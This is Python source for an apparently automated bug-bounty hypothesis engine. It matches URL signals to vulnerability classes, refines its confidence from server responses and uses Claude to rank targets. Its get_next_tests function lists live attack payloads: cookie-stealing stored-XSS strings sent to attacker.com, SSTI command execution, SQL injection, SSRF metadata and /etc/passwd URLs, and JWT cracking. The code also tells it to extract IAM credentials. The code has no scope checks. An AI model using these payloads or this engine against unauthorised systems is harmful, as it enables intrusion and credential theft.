"""Autonomous Hypothesis Engine.

Forms vulnerability hypotheses from observed signals, ranks them,
tests them safely, refines based on responses, abandons low-confidence
paths, and escalates promising ones.
"""
from __future__ import annotations

import json
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import anthropic

from app.core.config import settings
from app.core.logging import get_logger
from app.intelligence.reasoning import ReasoningAgentBase

logger = get_logger(__name__)


class HypothesisStatus(str, Enum):
    FORMING    = "forming"
    ACTIVE     = "active"
    TESTING    = "testing"
    CONFIRMED  = "confirmed"
    REFUTED    = "refuted"
    ABANDONED  = "abandoned"
    ESCALATED  = "escalated"


@dataclass
class Hypothesis:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    title: str = ""
    description: str = ""
    vuln_class: str = ""
    target_url: str = ""
    target_param: str = ""
    confidence: float = 0.0
    evidence: list[str] = field(default_factory=list)
    assumptions: list[str] = field(default_factory=list)
    test_results: list[dict[str, Any]] = field(default_factory=list)
    status: HypothesisStatus = HypothesisStatus.FORMING
    priority_score: float = 0.0
    bounty_estimate: str = ""
    reasoning: str = ""
    next_tests: list[str] = field(default_factory=list)
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "description": self.description,
            "vuln_class": self.vuln_class,
            "target_url": self.target_url,
            "target_param": self.target_param,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "assumptions": self.assumptions,
            "status": self.status.value,
            "priority_score": self.priority_score,
            "bounty_estimate": self.bounty_estimate,
            "reasoning": self.reasoning,
            "next_tests": self.next_tests,
            "test_result_count": len(self.test_results),
            "created_at": self.created_at,
            "updated_at": self.updated_at,
        }


# Signal patterns that trigger hypothesis formation
SIGNAL_PATTERNS = [
    {
        "signals": ["admin", "role", "id", "user_id"],
        "pattern": "admin route + role param + object ID",
        "vuln_class": "idor",
        "hypothesis_template": "Admin API route at {url} with role/id parameters suggests IDOR — substituting IDs may access unauthorized objects",
        "confidence": 0.65,
        "priority": 0.8,
    },
    {
        "signals": ["redirect", "next", "return", "callback", "goto"],
        "pattern": "redirect parameter",
        "vuln_class": "open_redirect",
        "hypothesis_template": "Parameter '{param}' at {url} accepts URL values — likely open redirect candidate",
        "confidence": 0.70,
        "priority": 0.5,
    },
    {
        "signals": ["import", "fetch", "proxy", "load", "download", "preview"],
        "pattern": "URL fetch parameter",
        "vuln_class": "ssrf",
        "hypothesis_template": "URL-fetching endpoint at {url} with param '{param}' — SSRF candidate, test with cloud metadata endpoints",
        "confidence": 0.75,
        "priority": 0.9,
    },
    {
        "signals": ["search", "q", "query", "filter", "name", "email"],
        "pattern": "search/filter parameter",
        "vuln_class": "sqli",
        "hypothesis_template": "Search/filter endpoint at {url} with param '{param}' — SQLi candidate, test boolean and time-based",
        "confidence": 0.55,
        "priority": 0.75,
    },
    {
        "signals": ["template", "render", "format", "theme", "layout"],
        "pattern": "template rendering parameter",
        "vuln_class": "ssti",
        "hypothesis_template": "Template rendering at {url} with param '{param}' — SSTI candidate, inject {{7*7}}",
        "confidence": 0.65,
        "priority": 0.85,
    },
    {
        "signals": ["upload", "file", "attachment", "image", "avatar"],
        "pattern": "file upload endpoint",
        "vuln_class": "file_upload",
        "hypothesis_template": "File upload at {url} — test extension bypass, SVG XSS, path traversal in filename",
        "confidence": 0.70,
        "priority": 0.80,
    },
    {
        "signals": ["graphql", "query", "mutation", "subscription"],
        "pattern": "GraphQL endpoint",
        "vuln_class": "graphql",
        "hypothesis_template": "GraphQL endpoint at {url} — test introspection, depth limits, IDOR via args, batch attacks",
        "confidence": 0.80,
        "priority": 0.70,
    },
    {
        "signals": ["comment", "bio", "description", "message", "post", "body"],
        "pattern": "user-controlled rich content",
        "vuln_class": "xss_stored",
        "hypothesis_template": "User-controlled rich content at {url} param '{param}' — stored XSS candidate",
        "confidence": 0.60,
        "priority": 0.85,
    },
    {
        "signals": ["jwt", "token", "bearer", "authorization"],
        "pattern": "JWT authentication",
        "vuln_class": "jwt",
        "hypothesis_template": "JWT-based auth at {url} — test algorithm confusion (RS256→HS256), 'none' algorithm, weak secret",
        "confidence": 0.55,
        "priority": 0.90,
    },
    {
        "signals": ["cors", "access-control", "origin"],
        "pattern": "CORS headers",
        "vuln_class": "cors",
        "hypothesis_template": "CORS headers present at {url} — test permissive origin reflection with credentials",
        "confidence": 0.65,
        "priority": 0.65,
    },
]


class HypothesisEngine(ReasoningAgentBase):
    """Autonomous Hypothesis Engine."""

    agent_name = "hypothesis_engine"

    def __init__(self, scan_id: str = "", workspace_id: str = ""):
        super().__init__(scan_id, workspace_id)
        self.client = anthropic.AsyncAnthropic(api_key=settings.ANTHROPIC_API_KEY)
        self.hypotheses: list[Hypothesis] = []

    def form_hypotheses_from_signals(
        self,
        urls: list[str],
        params: list[str],
        technologies: list[str],
        headers: dict[str, str],
        existing_vulns: list[dict[str, Any]],
    ) -> list[Hypothesis]:
        """Form initial hypotheses from observed signals."""
        self.think(
            f"Analyzing {len(urls)} URLs, {len(params)} params, {len(technologies)} technologies",
            confidence=0.9,
            assumptions=["URL list is representative", "Params are URL-decoded"],
        )

        hypotheses: list[Hypothesis] = []

        for url in urls[:100]:  # Cap for performance
            url_lower = url.lower()
            for pattern in SIGNAL_PATTERNS:
                matches = [s for s in pattern["signals"] if s in url_lower]
                if matches:
                    h = Hypothesis(
                        title=f"{pattern['vuln_class'].upper()} candidate — {url[:60]}",
                        description=pattern["hypothesis_template"].format(
                            url=url, param=matches[0]
                        ),
                        vuln_class=pattern["vuln_class"],
                        target_url=url,
                        confidence=pattern["confidence"],
                        priority_score=pattern["priority"],
                        status=HypothesisStatus.ACTIVE,
                        evidence=[f"URL contains signal: '{','.join(matches[:3])}'"],
                        assumptions=["Server processes parameter server-side", "No WAF blocking"],
                    )
                    hypotheses.append(h)
                    self.hypothesize(
                        h.description,
                        confidence=h.confidence,
                        rationale=f"Pattern match: {pattern['pattern']}",
                        assumptions=h.assumptions,
                    )
                    break  # one hypothesis per URL per pass

        for param in params:
            param_lower = param.lower()
            for pattern in SIGNAL_PATTERNS:
                if any(s in param_lower for s in pattern["signals"]):
                    h = Hypothesis(
                        title=f"{pattern['vuln_class'].upper()} via param '{param}'",
                        description=pattern["hypothesis_template"].format(
                            url="[multiple URLs]", param=param
                        ),
                        vuln_class=pattern["vuln_class"],
                        target_param=param,
                        confidence=pattern["confidence"] + 0.05,  # param match = slightly higher
                        priority_score=pattern["priority"],
                        status=HypothesisStatus.ACTIVE,
                        evidence=[f"Parameter name '{param}' matches {pattern['pattern']}"],
                        assumptions=["Parameter is reflected or processed server-side"],
                    )
                    hypotheses.append(h)
                    break

        # Technology-driven hypotheses
        tech_lower = [t.lower() for t in technologies]
        if any("jinja" in t or "django" in t or "flask" in t for t in tech_lower):
            h = Hypothesis(
                title="SSTI likely — Python template engine detected",
                description="Jinja2/Django/Flask template engine detected. SSTI is highly likely in any input reflected in template context.",
                vuln_class="ssti",
                confidence=0.80,
                priority_score=0.95,
                status=HypothesisStatus.ACTIVE,
                evidence=["Technology fingerprint: Python template engine"],
                assumptions=["User input reaches template context"],
            )
            hypotheses.append(h)
            self.escalate_path("Python template engine detected — SSTI priority elevated", "Test all reflected params with {{7*7}}")

        if any("graphql" in t for t in tech_lower):
            h = Hypothesis(
                title="GraphQL — test introspection + BOLA",
                description="GraphQL endpoint detected. Test introspection enabled, missing rate limits, IDOR via node IDs, batch attacks.",
                vuln_class="graphql",
                confidence=0.85,
                priority_score=0.85,
                status=HypothesisStatus.ACTIVE,
                evidence=["Technology fingerprint: GraphQL"],
            )
            hypotheses.append(h)

        # Header-driven hypotheses
        if "access-control-allow-origin" in {k.lower() for k in headers}:
            origin_val = headers.get("Access-Control-Allow-Origin", headers.get("access-control-allow-origin", ""))
            if origin_val == "*" or origin_val == "null":
                h = Hypothesis(
                    title="CORS misconfiguration — wildcard or null origin",
                    description=f"CORS header is '{origin_val}' — test with credentials for data leakage",
                    vuln_class="cors",
                    confidence=0.85,
                    priority_score=0.70,
                    status=HypothesisStatus.ACTIVE,
                    evidence=[f"Access-Control-Allow-Origin: {origin_val}"],
                )
                hypotheses.append(h)
                self.record_evidence(f"CORS wildcard: {origin_val}", [f"header:Access-Control-Allow-Origin"], confidence=0.9)

        # Deduplicate and rank
        seen_classes: dict[str, list[Hypothesis]] = {}
        for h in hypotheses:
            seen_classes.setdefault(h.vuln_class, []).append(h)

        ranked: list[Hypothesis] = []
        for vuln_class, hs in seen_classes.items():
            # Keep top 3 per class
            top = sorted(hs, key=lambda x: x.priority_score * x.confidence, reverse=True)[:3]
            ranked.extend(top)

        ranked.sort(key=lambda x: x.priority_score * x.confidence, reverse=True)
        self.hypotheses = ranked

        self.decide(
            f"Formed {len(ranked)} ranked hypotheses across {len(seen_classes)} vuln classes",
            rationale="Signal-pattern matching + technology fingerprinting",
            confidence=0.85,
        )

        return ranked

    async def refine_hypothesis(self, h: Hypothesis, test_response: dict[str, Any]) -> Hypothesis:
        """Refine a hypothesis based on test response."""
        status_code = test_response.get("status_code", 0)
        body = test_response.get("body", "")[:500]
        headers = test_response.get("headers", {})
        elapsed = test_response.get("elapsed_ms", 0)

        # Simple heuristic refinement
        prev_confidence = h.confidence

        # SSRF signals
        if h.vuln_class == "ssrf" and ("ami-id" in body or "security-credentials" in body or "instance-type" in body):
            h.confidence = 0.98
            h.status = HypothesisStatus.CONFIRMED
            self.escalate_path("SSRF confirmed — cloud metadata returned", "Extract IAM credentials, report P1")

        # SSTI signals
        elif h.vuln_class == "ssti" and "49" in body:  # 7*7=49
            h.confidence = 0.95
            h.status = HypothesisStatus.CONFIRMED
            self.escalate_path("SSTI confirmed — {{7*7}} evaluated to 49", "Attempt RCE via template context")

        # XSS signals
        elif h.vuln_class in ("xss", "xss_stored") and "alert" in body and "<script>" not in body:
            h.confidence = min(0.9, h.confidence + 0.2)
            h.status = HypothesisStatus.TESTING

        # SQLi time-based signals
        elif h.vuln_class == "sqli" and elapsed > 4500:
            h.confidence = 0.90
            h.status = HypothesisStatus.CONFIRMED
            self.escalate_path("SQLi time-based confirmed — response delayed >4.5s", "Test UNION extraction")

        # 403/401 suggests auth exists (good for IDOR testing)
        elif status_code in (401, 403):
            h.confidence = min(0.75, h.confidence + 0.05)
            h.test_results.append({"status": status_code, "note": "Auth wall — try different auth levels"})

        # 500 suggests injection reached the backend
        elif status_code == 500:
            h.confidence = min(0.80, h.confidence + 0.15)
            h.status = HypothesisStatus.TESTING
            self.think(f"500 error from {h.target_url} — injection likely reaching backend", confidence=0.75)

        # No signal — lower confidence
        elif status_code == 200 and not any(sig in body.lower() for sig in ["error", "exception", "warning"]):
            h.confidence = max(0.1, h.confidence - 0.10)
            if h.confidence < 0.25:
                h.status = HypothesisStatus.ABANDONED
                self.abandon_path("No response signal after test", h.title)

        h.test_results.append({
            "status_code": status_code,
            "elapsed_ms": elapsed,
            "body_preview": body[:200],
        })
        h.updated_at = time.time()

        delta = h.confidence - prev_confidence
        self.think(
            f"Confidence {'▲' if delta > 0 else '▼'} {abs(delta):.0%} for {h.title[:50]}",
            confidence=h.confidence,
        )

        return h

    async def ai_rank_hypotheses(
        self, hypotheses: list[Hypothesis], target_context: dict[str, Any]
    ) -> list[Hypothesis]:
        """Use Claude to re-rank hypotheses with deeper reasoning."""
        if not hypotheses:
            return []

        h_summary = "\n".join([
            f"{i+1}. [{h.vuln_class}] {h.title} (confidence={h.confidence:.0%}, priority={h.priority_score:.0%})"
            for i, h in enumerate(hypotheses[:20])
        ])

        tech_stack = ", ".join(target_context.get("technologies", []))
        prompt = f"""You are a senior bug bounty hunter ranking vulnerability hypotheses.

Target: {target_context.get('target', 'unknown')}
Technologies: {tech_stack or 'unknown'}
Subdomain count: {target_context.get('subdomain_count', 0)}

Current hypotheses:
{h_summary}

Re-rank these hypotheses by:
1. Likely impact if confirmed (P1=10, P2=7, P3=5, P4=3, P5=1)
2. Exploitability given the tech stack
3. Bounty potential on HackerOne
4. Test effort required (lower effort = higher rank)

Respond ONLY with JSON array of hypothesis numbers in ranked order with reasoning.
Format: [{{"rank": 1, "original_index": 2, "impact": 9, "reasoning": "...", "bounty_estimate": "$5000-10000"}}]"""

        try:
            resp = await self.client.messages.create(
                model=settings.AI_MODEL,
                max_tokens=600,
                messages=[{"role": "user", "content": prompt}],
            )
            text = resp.content[0].text
            start = text.find("[")
            end = text.rfind("]") + 1
            rankings = json.loads(text[start:end])

            reranked: list[Hypothesis] = []
            for r in rankings:
                idx = r.get("original_index", 1) - 1
                if 0 <= idx < len(hypotheses):
                    h = hypotheses[idx]
                    h.priority_score = r.get("impact", 5) / 10.0
                    h.bounty_estimate = r.get("bounty_estimate", "")
                    h.reasoning = r.get("reasoning", "")
                    reranked.append(h)

            # Append any not ranked
            ranked_idxs = {r.get("original_index", 1) - 1 for r in rankings}
            for i, h in enumerate(hypotheses):
                if i not in ranked_idxs:
                    reranked.append(h)

            self.decide(
                f"AI re-ranked {len(reranked)} hypotheses",
                rationale="Claude impact + exploitability analysis",
                confidence=0.85,
            )
            return reranked
        except Exception as e:
            logger.warning("ai_rank_failed", error=str(e))
            return hypotheses

    def get_next_tests(self, h: Hypothesis) -> list[str]:
        """Suggest next test actions for a hypothesis."""
        tests_by_class = {
            "idor": [
                "Replace your user ID with another user's ID in the path",
                "Test with sequential integers (1, 2, 3)",
                "Try accessing another user's object with your auth token",
                "Test GET vs POST vs DELETE with substituted IDs",
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://0x7f000001/",
                "http://[::1]/",
                "file:///etc/passwd",
            ],
            "xss": [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "'\"><img src=x onerror=alert(1)>",
            ],
            "xss_stored": [
                "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                "<img src=x onerror=this.src='//attacker.com/?c='+document.cookie>",
                "<svg onload=fetch('//attacker.com/?c='+document.cookie)>",
            ],
            "sqli": [
                "' OR 1=1--",
                "' AND SLEEP(5)--",
                "' UNION SELECT null,null,null--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            ],
            "open_redirect": [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https://evil.com%2F@legitimate.com",
            ],
            "cors": [
                "Set Origin: https://evil.attacker.com",
                "Set Origin: null",
                "Set Origin: https://legitimate.com.evil.com",
            ],
            "jwt": [
                "Decode and re-sign with algorithm=none",
                "Try RS256 key as HS256 with public key",
                "Brute force secret with hashcat: hashcat -a 0 -m 16500",
            ],
            "graphql": [
                "{__schema{types{name}}}",
                "Test query depth: deeply nested selection sets",
                "Batch attack: [{query: ...}, {query: ...}] × 100",
            ],
            "file_upload": [
                "Upload .php file as image.php.jpg",
                "Upload SVG with <script>",
                "Upload HTML file for stored XSS",
                "Use ../../../etc/passwd as filename",
            ],
        }
        return tests_by_class.get(h.vuln_class, ["Manual testing required"])
